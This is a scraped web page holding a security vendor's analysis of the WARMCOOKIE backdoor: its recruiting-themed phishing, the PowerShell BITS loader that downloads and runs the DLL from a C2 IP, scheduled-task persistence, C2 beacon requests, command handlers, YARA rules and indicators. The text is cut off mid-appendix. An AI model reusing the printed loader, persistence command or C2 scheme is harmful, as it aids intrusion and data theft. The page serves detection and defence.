8.74478 12.0913C8.52551 12.1822 8.33809 12.336 8.20624 12.5333ZM12.012 17.424C13.0771 17.4681 14.1246 17.1416 14.976 16.5V16.548C15.0075 16.5173 15.0327 16.4806 15.05 16.4402C15.0674 16.3997 15.0766 16.3563 15.0772 16.3122C15.0777 16.2682 15.0696 16.2245 15.0533 16.1837C15.0369 16.1428 15.0127 16.1055 14.982 16.074C14.9513 16.0425 14.9146 16.0173 14.8742 16C14.8337 15.9826 14.7903 15.9734 14.7462 15.9728C14.7022 15.9723 14.6585 15.9804 14.6177 15.9967C14.5768 16.0131 14.5395 16.0373 14.508 16.068C13.7797 16.5904 12.895 16.8487 12 16.8C11.1061 16.8399 10.2255 16.5732 9.504 16.044C9.44182 15.993 9.36289 15.9669 9.28256 15.9708C9.20222 15.9748 9.12622 16.0085 9.06935 16.0653C9.01247 16.1222 8.97879 16.1982 8.97484 16.2786C8.97089 16.3589 8.99697 16.4378 9.048 16.5C9.89937 17.1416 10.9469 17.4681 12.012 17.424ZM14.0933 14.2458C14.2907 14.3776 14.5227 14.448 14.76 14.448L14.748 14.496C14.9107 14.4978 15.0721 14.4664 15.2223 14.4038C15.3725 14.3413 15.5084 14.2488 15.6218 14.1321C15.7352 14.0154 15.8236 13.8768 15.8818 13.7248C15.9399 13.5728 15.9665 13.4106 15.96 13.248C15.96 13.0107 15.8896 12.7787 15.7578 12.5813C15.6259 12.384 15.4385 12.2302 15.2192 12.1393C14.9999 12.0485 14.7587 12.0248 14.5259 12.0711C14.2931 12.1174 14.0793 12.2316 13.9115 12.3995C13.7436 12.5673 13.6294 12.7811 13.5831 13.0139C13.5368 13.2467 13.5605 13.4879 13.6513 13.7072C13.7422 13.9265 13.896 14.1139 14.0933 14.2458Z" fill="currentColor"></path></svg><span>Reddit</span></a></div></div></article></main><footer class="mt-auto text-xs md:text-sm"><div class="container py-6 flex flex-col md:flex-row gap-2 md:gap-0 justify-between items-center"><div class="text-zinc-300"><nav><ul class="flex space-x-4"><li><a class="hover:text-white font-medium" href="/security-labs/sitemap.xml">Sitemap</a></li><li><a class="hover:text-white font-medium flex items-center space-x-1" href="https://elastic.co?utm_source=elastic-search-labs&amp;utm_medium=referral&amp;utm_campaign=search-labs&amp;utm_content=footer"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="inline-block w-3 h-3"><path stroke-linecap="round" stroke-linejoin="round" d="M13.5 6H5.25A2.25 2.25 0 003 8.25v10.5A2.25 2.25 0 005.25 21h10.5A2.25 2.25 0 0018 18.75V10.5m-10.5 6L21 3m0 0h-5.25M21 3v5.25"></path></svg><span>Elastic.co</span></a></li><li><a class="hover:text-white font-medium flex items-center space-x-1" href="https://twitter.com/elasticseclabs"><svg class="w-4 h-4 inline-block w-3 h-3" viewBox="0 0 24 24"><path fill="currentColor" d="M23.954 4.569c-.885.389-1.83.653-2.825.772a4.98 4.98 0 002.187-2.746 9.955 9.955 0 01-3.157 1.204 4.98 4.98 0 00-8.49 4.54A14.128 14.128 0 011.69 3.05a4.98 4.98 0 001.54 6.638A4.94 4.94 0 011.2 8.62v.06a4.98 4.98 0 004 4.87 4.94 4.94 0 01-2.24.086 4.98 4.98 0 004.64 3.45A9.97 9.97 0 010 20.35a14.075 14.075 0 007.59 2.22c9.16 0 14.17-7.583 14.17-14.17 0-.217-.005-.434-.015-.65a10.128 10.128 0 002.485-2.58l-.001-.001z"></path></svg><span>@elasticseclabs</span></a></li></ul></nav></div><div class="flex flex-col space-y-1 text-zinc-300"><p>© <!-- -->2024<!-- -->. Elasticsearch B.V. All Rights Reserved.</p></div></div></footer></main></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"article":{"title":"Dipping into Danger: The WARMCOOKIE backdoor","slug":"dipping-into-danger","date":"2024-06-12","description":"Elastic Security Labs observed threat actors masquerading as recruiting firms to deploy a new malware backdoor called WARMCOOKIE. This malware has standard backdoor capabilities, including capturing screenshots, executing additional malware, and reading/writing files.","image":"warmcookie.jpg","subtitle":"Novel malware discovery by Elastic Security Labs masquerades as a recruiting offer","tags":["warmcookie","backdoor","ref6127"],"body":{"raw":"\n## WARMCOOKIE at a glance\n\nElastic Security Labs observed a wave of email campaigns in late April targeting environments by deploying a new backdoor we’re calling WARMCOOKIE based on data sent through the HTTP cookie parameter. During initial triage, our team identified code overlap with a previously publicly reported [sample](https://esentire.com/blog/esentire-threat-intelligence-malware-analysis-resident-campaign) by eSentire. The unnamed sample (`resident2.exe`) discussed in the post appears to be an older or deviated version of WARMCOOKIE. While some features are similar, such as the implementation of string obfuscation, WARMCOOKIE contains differing functionality. Our team is seeing this threat distributed daily with the use of recruiting and job themes targeting individuals.\n\nWARMCOOKIE appears to be an initial backdoor tool used to scout out victim networks and deploy additional payloads. Each sample is compiled with a hard-coded C2 IP address and RC4 key.\n\nThis post will review an observed campaign and this new malware’s functionality. While the malware has a limited number of capabilities, it shouldn’t be taken lightly as it’s actively being used and impacting organizations at a global scale.\n\n## Key takeaways\n\n* REF6127 represents recruiting-themed phishing campaigns to deploy a new Windows backdoor: WARMCOOKIE\n* WARMCOOKIE is a newly discovered backdoor used to fingerprint a machine, capture screenshots of the victim machine, and deploy additional payloads\n* Threat actors are spinning up new domains and infrastructure weekly to support these campaigns\n* This research includes an IDAPython script to decrypt strings from WARMCOOKIE\n* Elastic Security provides prevention and visibility capabilities across the entire WARMCOOKIE infection chain\n\n## REF6127 campaign overview\n\n![WARMCOOKIE execution flow](/assets/images/dipping-into-danger/image10.png \"WARMCOOKIE execution flow\")\n\nSince late April 2024, our team has observed new phishing campaigns leveraging lures tied to recruiting firms. These emails targeted individuals by their names and their current employer, enticing victims to pursue new job opportunities by clicking a link to an internal system to view a job description. Below is an example of the phishing email collected from previous open source reporting.\n\n![Phishing email - Subject: “We’re Interested”](/assets/images/dipping-into-danger/image14.png \"Phishing Email - Subject: “We’re Interested”\")\n\nOnce clicked, the users hit a landing page that looks like a legitimate page specifically targeted for them. There, they are prompted to download a document by solving a CAPTCHA challenge. The landing pages resemble previous campaigns documented by Google Cloud’s security team when discussing a new variant of [URSNIF](https://cloud.google.com/blog/topics/threat-intelligence/rm3-ldr4-ursnif-banking-fraud/). Below is an example of the landing page collected from previous open source reporting.\n\n![Landing page](/assets/images/dipping-into-danger/image6.png \"Landing page\")\n\nOnce the CAPTCHA is solved, an obfuscated JavaScript file is downloaded from the page. Our sample was named `Update_23_04_2024_5689382.js`; however, other samples used a different but similar naming structure. \n\nThis obfuscated script runs PowerShell, kicking off the first task to load WARMCOOKIE.\n\n![Initial execution chain as seen in Elastic Security for Endpoint](/assets/images/dipping-into-danger/image17.png \"Initial execution chain as seen in Elastic Security for Endpoint\")\n\nThe PowerShell script abuses the Background Intelligent Transfer Service (BITS) to download WARMCOOKIE and run the DLL with the `Start` export.\n\n```powershell\nstart-job { param($a) Import-Module BitsTransfer; $d = $env:temp + '\\' + \n    [System.IO.Path]::GetRandomFileName(); Start-BitsTransfer -Source \n    'http://80.66.88[.]146/data/5fb6dd81093a0d6812c17b12f139ce35' \n    -Destination $d; if (![System.IO.File]::Exists($d)) {exit}; $p = $d + \n    ',Start'; rundll32.exe $p; Start-Sleep -Seconds 10} -Argument 0 | wait-job | Receive-Job\n```\n\n### REF6127 infrastructure overview\n\nBy leveraging tools like [urlscan.io](https://urlscan.io/ip/45.9.74.135) and [VirusTotal](https://www.virustotal.com/gui/ip-address/45.9.74.135/relations), we observed the threat actor continually generating new landing pages rapidly on IP address `45.9.74[.]135`. The actor pushed to target different recruiting firms in combination with keywords related to the job search industry. \n\n![Domains associated with 45.9.74[.]135](/assets/images/dipping-into-danger/image3.png \"Domains associated with 45.9.74[.]135\")\n\nBefore hitting each landing page, the adversary distances itself by using compromised infrastructure to host the initial phishing URL, which redirects the different landing pages.\n\n![Phishing link redirection](/assets/images/dipping-into-danger/image21.png \"Phishing link redirection\")\n\nThe threat actor generates new domains while the reputation catches up with each domain after each campaign run. At the time of writing, the threat actor can be seen pivoting to fresh domains without many reputation hits.\n\n![Reputation for recently generated domains](/assets/images/dipping-into-danger/image18.png \"Reputation for recently generated domains\")\n\n## WARMCOOKIE malware anlaysis\n\nWARMCOOKIE is a Windows DLL used by the threat actor in two different stages. The first stage occurs right after the PowerShell download with the execution of WARMCOOKIE using the `Start` export. \n\n### Stage 1\n\nStage 1 copies the downloaded DLL from a temporary directory with a random name, such as: `wid4ta3v.3gm,` and places a copy of the DLL at `C:\\ProgramData\\RtlUpd\\RtlUpd.dll`\n\nAfter the copy, the malware sets up persistence using COM with the Windows Task Scheduler to configure the DLL to run with the following parameters. \n\n```cmd\n\"C:\\WINDOWS\\system32\\rundll32.exe\" \"C:\\ProgramData\\RtlUpd\\RtlUpd.dll\",Start /p\n```\n\nWith this design choice, WARMCOOKIE will run with System privileges from the Task Scheduler Engine. Below is a screenshot from [Hatching Triage](https://tria.ge/240528-2dhvdagb62/behavioral1) showing these two stages:\n\n![WARMCOOKIE - Execution chain](/assets/images/dipping-into-danger/image13.png \"WARMCOOKIE - Execution chain\")\n\n#### Persistence\n\nA critical part of the infection chain comes from the scheduled task, which is set up at the very beginning of the infection. The task name (`RtlUpd`) is scheduled to run every 10 minutes every day.\n\n![Persistence - Scheduled Task](/assets/images/dipping-into-danger/image34.png \"Persistence - Scheduled Task\")\n\n### Stage 2\n\nThe second stage is where the DLL is combined with the command line (`Start /p`) and contains the core functionality of WARMCOOKIE. The malware starts by looking for the DLL inside the temporary directory from the PowerShell download.\n\n![Initial code within WARMCOOKIE](/assets/images/dipping-into-danger/image23.png \"Initial code within WARMCOOKIE\")\n\n#### Obfuscation \n\nWARMCOOKIE protects its strings using a custom string decryption algorithm. The first four bytes of each encrypted string in the `.rdata` section represent the size, the next four-bytes represent the RC4 key, and the remaining bytes represent the string.\n\n![String Obfuscation - Legend](/assets/images/dipping-into-danger/image22.png \"String Obfuscation - Legend\")\n\nBelow is the CyberChef recipe using the bytes from the screenshot above:\n\n![String Decryption via CyberChef](/assets/images/dipping-into-danger/image9.png \"String Decryption via CyberChef\")\n\nOne interesting observation is that the malware developer doesn’t always rotate the RC4 key between the encrypted strings.\n\n![Same RC4 key for different encrypted string](/assets/images/dipping-into-danger/image1.png \"Same RC4 key for different encrypted string\")\n\n#### Dynamic API loading\n\nTo prevent static analysis from identifying its core functionality, WARMCOOKIE uses dynamic API loading. There is no API hashing/resolving, and the targeted DLLs and sensitive strings are protected using encryption.\n\n![Dynamic API loading within WARMCOOKIE](/assets/images/dipping-into-danger/image32.png \"Dynamic API loading within WARMCOOKIE\")\n\nAs demonstrated in the previous image, the developer shows some consideration for OpSec: any decrypted string is wiped from memory immediately after use, potentially avoiding memory signature scans.\n\n#### Anti-debugging\n\nThe malware contains a few anti-analysis checks commonly used to target sandboxes. These are based on logic for checking the active number of CPU processors and physical/virtual memory values.\n\n![Sandbox verification](/assets/images/dipping-into-danger/image40.png \"Sandbox verification\")\n\nBelow are the following conditions:\n\n* If the number of processors is greater than or equal to 4 and the calculated value from the `GlobalMemoryStatusEx` call is greater than or equal to 0xF00, the malware will continue execution\n* If the number of processors is greater than or equal to 8, the malware will continue execution\n* If the calculated value from the `GlobalMemoryStatusEx` call is greater than `0x2000`, the malware will continue execution\n\n#### Mutex\n\nEach WARMCOOKIE sample comes hard coded with a GUID-like string as a mutex. Below are some examples we have observed:\n\n* `f92e6f3c-9cc3-4be0-966c-1be421e69140`\n* `91f785f4-2fa4-4c85-954d-b96768ca76f2`\n\n![Setup before main functionality, including mutex creation](/assets/images/dipping-into-danger/image35.png \"Setup before main functionality, including mutex creation\")\n\nBefore the main functionality is executed, WARMCOOKIE uses an OR statement to verify the command-line arguments with `/p` returns `True` or to check whether the scheduled task persistence needs to be created.\n\n#### Execution\n\nBefore the backdoor makes its first outbound network request, it captures the following values used to fingerprint and identify the victim machine. \n\n* Volume serial number\n* DNS domain of the victim machine\n* Computer name\n* Username\n\nThis was a criteria used to identify the similarities to the malware in eSentire’s [report](https://www.esentire.com/blog/esentire-threat-intelligence-malware-analysis-resident-campaign).\n\n![Checksum calculations similar to eSentire's report](/assets/images/dipping-into-danger/image8.png \"Checksum calculations similar to eSentire's report\")\n\nThe WARMCOOKIE C2 server likely leverages a CRC32 checksum function to verify content sent from the victim machine. Inside WARMCOOKIE itself is a checksum function that takes an input string, a length, and an initial seed value for the CRC32 function. At the beginning of the function, the seed value is negated, so at different times, the checksum function is called with different seeds. We believe the developer added this step to make it a little harder for researchers to analyze and waste time.\n\n![Beginning of CRC32 checksum function](/assets/images/dipping-into-danger/image31.png \"Beginning of CRC32 checksum function\")\n\nThe following three checksum calculations are encrypted with RC4 and sent through the HTTP cookie parameter:\n\n* CRC32(c2_message_data)\n* CRC32(mutex) ^ volume serial number\n* CRC32(username) ^ CRC32(computer name)\n\nBelow is the implementation in Python with a usage example in the Appendix:\n\n```python\ndef calculate_checksum(str_input, str_len, i):\n    if i == 0:\n        i = 0xFFFFFFFF\n    if i == -1:\n        i = 0\n\n    for idx in range(0, str_len, 2):\n        v6 = str_input[idx] | (str_input[idx + 1] \u003c\u003c 8)\n        for _ in range(16):\n            if (v6 ^ i) \u0026 1:\n                i = ((i \u003e\u003e 1) ^ 0xEDB88320) \u0026 0xFFFFFFFF\n            else:\n                i = (i \u003e\u003e 1) \u0026 0xFFFFFFFF\n            v6 \u003e\u003e= 1\n\n    return ~i \u0026 0xFFFFFFFF\n```\n\n#### Communication\n\nWARMCOOKIE samples communicate over HTTP with a hardcoded IP address. The family uses a combination of RC4 and Base64 to protect its network traffic. The RC4 key is embedded in each sample. We have observed the same key being used in multiple samples. The key during this analysis is `24de21a8dc08434c`\n\n![Hardcoded RC4 key being decrypted](/assets/images/dipping-into-danger/image11.png \"Hardcoded RC4 key being decrypted\")\n\nThe malware uses a custom structure to send the initial request to the C2 server, including the previously described checksum values and several fields used to track the offsets and size of the variable data.\n\nThese values are sent through the HTTP cookie parameter using the following custom structure:\n\n```cpp\nenum request_type\n{ \n    REGISTRATION = 1, \n    COMMAND = 2 \n};\n\nstruct os_info\n{\n    int major_version;\n    int minor_version;\n    int build_number;\n    int version_calc;\n};\n\nstruct initial_request\n{\n    int checksum_c2_message_data;\n    int checksum_volume_mutex;\n    int checksum_computer_name_username;\n    request_type request_type;\n    os_info os_ver;\n    int offset_to_dns_domain;\n    int size_base64_dns_domain;\n    int offset_to_base64_computer_name;\n    int size_base64_computer_name;\n    int offset_to_base64_username;\n    int size_base64_username;\n    char base64_dns_domain[]; // Variable-length array\n    char base64_username[]; // Variable-length array\n    char base64_computer_name[]; // Variable-length array \n};\n```\n\nThe first request to the C2 server is sent through a GET request using User Agent: `Mozilla / 4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1;.NET CLR 1.0.3705`.\n\n```curl\nGET http://185.49.69[.]41/ HTTP/1.1\nCookie: x41OYTpmEwUUKm2AvnkS2onu1XqjP6shVvosIXkAD957a9RplEGFsUjR8f/lP1O8EERtf+idl0bimsKh8mRA7+dL0Yk09SwgTUKBu9WEK4RwjhkYuxd2JGXxhlA=\nUser-Agent: Mozilla / 4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1;.NET CLR 1.0.3705)\nHost: 185.49.69[.]41\nConnection: Keep-Alive\nPragma: no-cache\n```\n\nBelow is the CyberChef recipe of the HTTP cookie parameter decrypted from the first request, followed by a legend of the fields:  \n\n![Decryption of HTTP cookie via CyberChef](/assets/images/dipping-into-danger/image24.png \"Decryption of HTTP cookie via CyberChef\")\n\n![Decryption of HTTP cookie parameters via ImHex](/assets/images/dipping-into-danger/image20.png \"Decryption of HTTP cookie parameters via ImHex\")\n\nWARMCOOKIE inserts a few integrity checks by generating hashes using the previously described checksum function. For example, the data in the decrypted HTTP cookie parameter from the 4th byte to the end is hashed and placed at the beginning (offset 0). Using the example above, this checksum value is `0xe51387e9`\n\nBefore the malware can receive instructions, integrity checks are also used to verify the incoming response from the C2 server. In this scenario, the C2 server produces the expected checksum for the data sent to the victim machine. This is located in the first four bytes of the request.\n \n![Checksum verification from incoming server request](/assets/images/dipping-into-danger/image7.png \"Checksum verification from incoming server request\")\n\nBelow is a demonstration of this integrity check where the request data’s hash is `0x50d26cc3`.\n\n![Integrity check via CyberChef](/assets/images/dipping-into-danger/image39.png \"Integrity check via CyberChef\")\n\nIf the checksum matches, WARMCOOKIE reads the command ID at the 8th-byte offset of the request to proceed to move to the next command handler.\n\n### Bot functionality\n\nWARMCOOKIE provides 7 command handlers for threat actors to retrieve additional victim information, record screenshots, launch additional payloads, etc. The provided functionality is relatively straightforward, allowing threat groups that need a lightweight backdoor to monitor victims and deploy further damaging payloads such as ransomware.\n\n| Command ID | Description                                             |\n|------------|---------------------------------------------------------|\n| 1          | Retrieve victim details                                 |\n| 2          | Record screenshots of victim machine                    |\n| 3          | Retrieve installed programs via Uninstall registry path |\n| 4          | Command-line execution (cmd.exe /c)                     |\n| 5          | Write file to victim machine                            |\n| 6          | Read file from victim machine                           |\n| 10         | Delete scheduled task persistence                       |\n\n#### Retrieve victim details - command ID (1)\n\nThis handler fingerprints and identifies the victim machines by collecting the IP address and CPU information. Interestingly, the imports required for this handler are statically imported. \n\n![Retrieving CPU info (Handler 1)](/assets/images/dipping-into-danger/image16.png \"Retrieving CPU info (Handler 1)\")\n\nThe malware uses HTTP `POST` requests when sending data back to the C2 server. The HTTP POST request data is encrypted via RC4 and sent over the network in raw form. In addition, the IP address and CPU information are Base64 encoded.\n\n```curl\nPOST http://185.49.69[.]41/ HTTP/1.1\nCookie: x41OYTpmEwUUKm2AvnkS2onu1XqjP6shVvosIXkAD957a9RplEGFsUjR8f/lP1O8EERtf+idl0bimsKh8mRA7+dL0Yk09SwgTUKBu9WEK4RwjhkYuxd2JGXxhlA=\nUser-Agent: Mozilla / 4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1;.NET CLR 1.0.3705)\nHost: 185.49.69.41\nContent-Length: 136\nConnection: Keep-Alive\nPragma: no-cache\n\n  qI:f*m  yڂ  z ? !  ,!w   k i A  K    k8 .(M ޣ\u003e ދ  u[ôz  0 -U~    9 z G(  *X  o_  _      * Y, q  glTs   XI8b\\)W   W\"\n```\n\nAfter decrypting the HTTP POST request data, this presents a similar structure as before, where the data is front-loaded with the checksum values, offsets, and sizes to the pertinent information targeted by the handler. In this case, the Base64 encoded data is the IP Address and CPU info.\n\n![Decrypted POST Request Data from Handler 1](/assets/images/dipping-into-danger/image36.png \"Decrypted POST Request Data from Handler 1\")\n\n| Encoded Value                                                    | Decoded Value                                           |\n|------------------------------------------------------------------|---------------------------------------------------------|\n| MTkyLjE2OC4xODIuMTMx                                             | 192.168.182.131                                         |\n| QU1EIFJ5emVuIDcgNzgwMFgzRCA4LUNvcmUgUHJvY2Vzc29yICAgICAgICAgICA= | AMD Ryzen 7 7800X3D 8-Core Processor                    |\n\n#### Screenshot capture - command ID (2)\n\nThe ability to capture screenshots from victim machines provides a wide range of malicious options, such as stealing sensitive information displayed on the screen or actively monitoring the victim’s machine. This handler dynamically loads Windows DLLs used for graphics and drawing operations, such as `GDI32.DLL` and `GDIPLUS.DLL`, and then uses various APIs, such as `BitBlt`,`CreateCompatibleBitmap`, and `GetSystemMetrics` to generate the screenshot.\n\n![Screen capture via BitBlt](/assets/images/dipping-into-danger/image26.png \"Screen capture via BitBlt\")\n\nThe collected screenshot is encrypted with RC4 and sent through a POST request along with the checksum data.\n\n![Decrypted POST Request Data from Handler 3](/assets/images/dipping-into-danger/image38.png \"Decrypted POST Request Data from Handler 3\")\n\nBy looking for the file header `JPEG File Interchange Format (JFIF)`, we can carve out the image, and find a high-quality image of our sandbox machine (below) based on our request to this handler.\n\n![Desktop capture from VM sandbox](/assets/images/dipping-into-danger/image29.jpg \"Desktop capture from VM sandbox\")\n\n#### Retrieve installed programs - command ID (3)\n\nThis handler enumerates the installed programs on the victim machine via the registry key:\n\n```\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\n```\n\n![Grabbing the installed programs from the registry](/assets/images/dipping-into-danger/image12.png \"Grabbing the installed programs from the registry\")\n\nThe program's name, version, and installation date are Base64 encoded and placed into a pipe-delimited format along with the checksum data, offsets, and sizing.\n\n![Decrypted POST Request Data from Handler 3](/assets/images/dipping-into-danger/image15.png \"Decrypted POST Request Data from Handler 3\")\n\nBelow is an example of one of the registry entries:\n\n| Encoded Value            | Decoded Value     |\n|--------------------------|-------------------|\n| Ny1aaXAgMTguMDEgKHg2NCk= | 7-Zip 18.01 (x64) |\n\n#### Command-line execution - command ID (4)\n\nWARMCOOKIE uses this handler to provide backdoor access to the victim machine. The operator provides an argument that gets executed to `cmd.exe /c `without a console window.\n\n![New process creation with custom command line](/assets/images/dipping-into-danger/image37.png \"New process creation with custom command line\")\n\nIn the example below, `whoami` is provided as the argument:\n\n![Process tree with command-lines](/assets/images/dipping-into-danger/image33.png \"Process tree with command-lines\")\n\nThis function reads the output from the provided command and stores it in Base64, where it’s sent back to the C2 server. Below is an example of the decrypted data for this handler:\n\n![Decrypted POST Request Data from Handler 4](/assets/images/dipping-into-danger/image30.png \"Decrypted POST Request Data from Handler 4\")\n\n| Encoded Value                | Decoded Value       |\n|------------------------------|---------------------|\n| ZGVza3RvcC0yYzNpcWhvXHJlbQ0K | desktop-2c3iqho\\rem |\n\n#### Write file - command ID (5)\n\nWARMCOOKIE can drop files on the victim machine; the threat actors provide the file path and file data.\n\n![File Creation within Handler 5](/assets/images/dipping-into-danger/image28.png \"File Creation within Handler 5\")\n\nAs a test, we can write a file within a directory with some data and then read it in the next handler.\n\n![Custom file creation](/assets/images/dipping-into-danger/image27.png \"Custom file creation\")\n\n![Data written to custom file](/assets/images/dipping-into-danger/image19.png \"Data written to custom file\")\n\nDepending on the file write result, WARMCOOKIE will send out a POST request with one of the following Base64 encoded values:\n\n* `OK`\n* `ERROR: Cannot write file`\n\n![Decrypted POST Request Data from Handler 5](/assets/images/dipping-into-danger/image2.png \"Decrypted POST Request Data from Handler 5\")\n\n#### Read file - command ID (6)\n\nThis handler can read file content from machines infected with WARMCOOKIE. The threat actor needs to provide the file path as the argument. \n\n![Reading files within Handler 6](/assets/images/dipping-into-danger/image25.png \"Reading files within Handler 6\")\n\nDepending on the file read result, WARMCOOKIE will send out a POST request with one of the following Base64 encoded values along with the file contents:\n\n* `OK (See 'Files' tab)`\n* `ERROR: Cannot read file`\n\n![Decrypted POST Request Data from Handler 6](/assets/images/dipping-into-danger/image5.png \"Decrypted POST Request Data from Handler 6\")\n\nBased on the previous wording around a `Files` tab, the WARMCOOKIE operators may use a GUI element.\n\n#### Remove persistence - command ID (10)\n\nThis handler removes the previously configured scheduled task with the name `RtlUpd`. By leveraging COM, it will call `DeleteFileW` within `mstask.dll` to remove the task.\n\n![Callstack showing task deletion via COM](/assets/images/dipping-into-danger/image4.png \"Callstack showing task deletion via COM\")\n\n## IDA string decryption tool\n\nElastic Security Labs is releasing an IDAPython script used to decrypt strings from WARMCOOKIE. The decrypted strings will be placed in the IDA Pro decompiler helping analysts identify key functionality. The string decryption and IDA commenting tool can be downloaded [here](https://github.com/elastic/labs-releases/tree/main/tools/warmcookie).\n\n## Conclusion\n\nWARMCOOKIE is a newly discovered backdoor that is gaining popularity and is being used in campaigns targeting users across the globe. Our team believes this malware represents a formidable threat that provides the capability to access target environments and push additional types of malware down to victims. While there is room for improvement on the malware development side, we believe these minor issues will be addressed over time. Elastic Security Labs will continue to monitor this threat and recommends that the industry do the same.\n\n## WARMCOOKIE and MITRE ATT\u0026CK\n\nElastic uses the [MITRE ATT\u0026CK](https://attack.mitre.org/) framework to document common tactics, techniques, and procedures that advanced persistent threats use against enterprise networks.\n\n### Tactics\n\nTactics represent the why of a technique or sub-technique. It is the adversary’s tactical goal: the reason for performing an action.\n\n* [Initial Access](https://attack.mitre.org/tactics/TA0001)\n* [Execution](https://attack.mitre.org/tactics/TA0002/)\n* [Defense Evasion](https://attack.mitre.org/tactics/TA0005/)\n* [Discovery](https://attack.mitre.org/tactics/TA0007)\n* [Command and Control](https://attack.mitre.org/tactics/TA0011)\n* [Exfiltration](https://attack.mitre.org/tactics/TA0010/)\n\n### Techniques\n\nTechniques represent how an adversary achieves a tactical goal by performing an action.\n\n* [Phishing](https://attack.mitre.org/techniques/T1566/)\n* [User Execution: Malicious Link](https://attack.mitre.org/techniques/T1204/001/)\n* [Command and Scripting Interpreter: PowerShell](https://attack.mitre.org/techniques/T1059/001/)\n* [System Information Discovery](https://attack.mitre.org/techniques/T1082/)\n* [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053/)\n* [Screen Capture](https://attack.mitre.org/techniques/T1113/)\n* [Command and Scripting Interpreter: Windows Command Shell](https://attack.mitre.org/techniques/T1059/003/)\n\n## Preventing and detecting WARMCOOKIE\n\n### Prevention\n\n* [Suspicious PowerShell Downloads](https://github.com/elastic/protections-artifacts/blob/ecde1dfa1aaeb6ace99e758c2ba7d2e499f93515/behavior/rules/execution_suspicious_powershell_downloads.toml)\n* [Scheduled Task Creation by an Unusual Process](https://github.com/elastic/protections-artifacts/blob/ecde1dfa1aaeb6ace99e758c2ba7d2e499f93515/behavior/rules/persistence_scheduled_task_creation_by_an_unusual_process.toml)\n* [Suspicious PowerShell Execution via Windows Scripts](https://github.com/elastic/protections-artifacts/blob/ecde1dfa1aaeb6ace99e758c2ba7d2e499f93515/behavior/rules/execution_suspicious_powershell_execution.toml)\n* [RunDLL32/Regsvr32 Loads a DLL Downloaded via BITS](https://github.com/elastic/protections-artifacts/blob/ecde1dfa1aaeb6ace99e758c2ba7d2e499f93515/behavior/rules/defense_evasion_rundll32_regsvr32_loads_a_dll_downloaded_via_bits.toml)\n* [RunDLL32 with Unusual Arguments](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/defense_evasion_rundll32_with_unusual_arguments.toml)\n* [Windows.Trojan.WarmCookie](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_WarmCookie.yar)\n\n### Detection w/YARA\n\nElastic Security has created YARA rules to identify this activity. Below are YARA rules to identify [WARMCOOKIE](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_WarmCookie.yar):\n\n```yara\nrule Windows_Trojan_WarmCookie_7d32fa90 {\n    meta:\n        author = \"Elastic Security\"\n        creation_date = \"2024-04-29\"\n        last_modified = \"2024-05-08\"\n        os = \"Windows\"\n        arch = \"x86\"\n        threat_name = \"Windows.Trojan.WarmCookie\"\n        license = \"Elastic License v2\"\n\n     strings:\n        $seq_checksum = { 45 8D 5D ?? 45 33 C0 41 83 E3 ?? 49 8D 4E ?? 44 03 DB 41 8D 53 ?? }\n        $seq_string_decrypt = { 8B 69 04 48 8D 79 08 8B 31 89 6C 24 ?? 48 8D 4E ?? E8 }\n        $seq_filesearch = { 48 81 EC 58 02 00 00 48 8B 05 82 0A 02 00 48 33 C4 48 89 84 24 40 02 00 00 45 33 C9 48 8D 44 24 30 45 33 C0 48 89 44 24 20 33 C9 41 8D 51 1A FF 15 83 4D 01 00 85 C0 78 22 48 8D 4C 24 30 E8 1D }\n        $seq_registry = { 48 81 EC 80 02 00 00 48 8B 05 F7 09 02 00 48 33 C4 48 89 84 24 70 02 00 00 4C 89 B4 24 98 02 00 00 48 8D 0D 4D CA 01 00 45 33 F6 41 8B FE E8 02 4F 00 00 48 8B E8 41 B9 08 01 00 00 48 8D 44 24 }\n        $plain_str1 = \"release.dll\" ascii fullword\n        $plain_str2 = \"\\\"Main Invoked.\\\"\" ascii fullword\n        $plain_str3 = \"\\\"Main Returned.\\\"\" ascii fullword\n        $decrypt_str1 = \"ERROR: Cannot write file\" wide fullword\n        $decrypt_str2 = \"OK (No output data)\" wide fullword\n        $decrypt_str3 = \"OK (See 'Files' tab)\" wide fullword\n        $decrypt_str4 = \"cmd.exe /c %ls\" wide fullword\n        $decrypt_str5 = \"Cookie:\" wide fullword\n        $decrypt_str6 = \"%ls\\\\*.*\" wide fullword\n    condition:\n        (3 of ($plain*)) or (2 of ($seq*)) or 4 of ($decrypt*)\n}\n```\n\n## Observations\n\nAll observables are also available for [download](https://github.com/elastic/labs-releases/tree/main/indicators/warmcookie) in both ECS and STIX format.\n\nThe following observables were discussed in this research.\n\n| Observable                                                       | Type      | Name       | Reference            |\n|------------------------------------------------------------------|-----------|------------|----------------------|\n| `ccde1ded028948f5cd3277d2d4af6b22fa33f53abde84ea2aa01f1872fad1d13` | SHA-256   | RtlUpd.dll | WARMCOOKIE           |\n| `omeindia[.]com`                                                   | domain    |            | Phishing link        |\n| `assets.work-for[.]top`                                            | domain    |            | Landing page         |\n| `45.9.74[.]135`                                                    | ipv4-addr |            | Landing page         |\n| `80.66.88[.]146`                                                   | ipv4-addr |            | WARMCOOKIE C2 server |\n| `185.49.69[.]41`                                                   | ipv4-addr |            | WARMCOOKIE C2 server |\n\n## References\n\nThe following were referenced throughout the above research:\n\n* [https://www.esentire.com/blog/esentire-threat-intelligence-malware-analysis-resident-campaign](https://www.esentire.com/blog/esentire-threat-intelligence-malware-analysis-resident-campaign)\n* [https://x.com/Cryptolaemus1/status/1785423804577034362](https://x.com/Cryptolaemus1/status/1785423804577034362)\n\n## Appendix\n\n**Checksum example**\n\n```python\ndef calculate_checksum(str_input, str_len, i):\n    if i == 0:\n        i = 0xFFFFFFFF\n    if i == -1:\n        i = 0\n\n    for idx in range(0, str_len, 2):\n        v6 = str_input[idx] | (str_input[idx + 1] \u003c\u003c 8)\n        for _ in range(16):\n            if (v6 ^ i) \u0026 1:\n                i = ((i \u003e\u003e 1) ^ 0xEDB88320) \u0026 